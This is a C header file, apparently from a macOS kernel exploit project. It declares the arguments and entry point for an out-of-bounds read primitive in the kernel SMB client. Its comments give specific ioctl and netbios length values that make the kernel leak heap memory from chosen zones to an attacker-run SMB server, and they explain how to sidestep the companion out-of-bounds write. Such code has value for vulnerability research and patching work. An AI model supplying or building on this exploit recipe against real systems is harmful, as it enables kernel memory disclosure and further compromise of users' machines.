//
//  zkext_neighbor_reader_xs.h
//  kmem_xepg
//
//  Created by admin on 1/3/22.
//

#ifndef zkext_neighbor_reader_xs_h
#define zkext_neighbor_reader_xs_h

#include <stdio.h>


struct xpl_oob_reader_base_args {
    //  SMB server IPV4 socket address
    struct sockaddr_in smb_addr;
    
    //  Server socket address ioc length
    /// This value determines to which zone in `KHEAP_KEXT` will the `saddr` be allocated when
    /// handling `SMBIOC_NEGOTIATE` ioctl syscall
    uint32_t saddr_ioc_len;
    
    //  Server netbios socket address length
    /// Providing a value greater than the element size of zone where `saddr` is allocated, will
    /// lead to out of bound read. For example if `saddr_ioc_len` is 32 and `saddr_snb_len` is
    /// 56, the `saddr` will be allocated on `default.kalloc.32` zone and subsequent copy of socket
    /// address will lead to 24 bytes out of bound read
    uint8_t saddr_snb_len;
    
    //  Server netbios name first segment length
    /// This value determines the amount of memory sent to server from `snb_name` field of
    /// the `saddr` socket address. For example, if `saddr_ioc_len` is 32 , `saddr_snb_len` is
    /// 56 and`saddr_snb_name_seglen` is `(32 - offsetof(struct sockaddr_nb, snb_name)) + 24`
    /// will lead to 24 bytes out of bound read data being sent to SMB server
    /// NOTE: Before the `snb_name` is sent to SMB server, the socket address is duplicated
    /// using `smb_dup_sockaddr` method, which will duplicate the `saddr` to `default.64`
    /// zone. So if you want an out of bound read from `default.64` zone instead of other
    /// zones in `KHEAP_KEXT`, the following values can be used: `saddr_ioc_len = 64`,
    /// `saddr_snb_len = 64` and `saddr_snb_name_seglen = 64 +  (64 - offsetof(struct sockaddr_nb, snb_name))`.
    /// This way the OOB write vulnerability will not be triggered.
    uint8_t saddr_snb_name_seglen;
    
    //  Local nebios socket address length
    uint8_t laddr_snb_len;
    
    //  Local socket address ioc length
    uint32_t laddr_ioc_len;
    
    //  Local netbios name first segment length
    uint8_t laddr_snb_name_seglen;
};


/// Perform OOB read
/// @param args see above for more details
/// @param server_nb_name buffer for storing the server netbios name received by xpl_smbx server
/// @param server_nb_name_size size of `server_nb_name` buffer
/// @param local_nb_name buffer for storing the local netbios name received by xpl_smbx server
/// @param local_nb_name_size size of `local_nb_name` buffer
void xpl_oob_reader_base_read(const struct xpl_oob_reader_base_args* args, char* server_nb_name, uint32_t* server_nb_name_size, char* local_nb_name, uint32_t* local_nb_name_size);

#endif /* zkext_neighbor_reader_xs_h */
